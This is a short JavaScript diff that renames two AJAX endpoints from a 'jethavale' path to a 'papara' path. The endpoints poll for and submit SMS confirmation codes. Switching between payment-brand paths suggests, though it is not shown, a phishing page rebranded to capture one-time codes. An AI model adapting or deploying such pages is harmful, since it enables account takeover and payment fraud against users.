@@ -178,7 +178,7 @@ function myLoop2() {         //  create a loop function
     setTimeout(function() {   //  call a 3s setTimeout when the loop is called
       $.ajax({
         type: "POST",
-        url: "/jethavale/request.php?q=sms-durum",
+        url: "/papara/request.php?q=sms-durum",
         success: function(response) {
             if (response == '1'){
               b + 100;
@@ -207,7 +207,7 @@ function myLoop2() {         //  create a loop function
 function smsOnay() {
   $.ajax({
     type: "POST",
-    url: "/jethavale/request.php?q=sms-onay",
+    url: "/papara/request.php?q=sms-onay",
     data: $("#form").serialize(),
     success: (response) => {
       if (response == "success") {
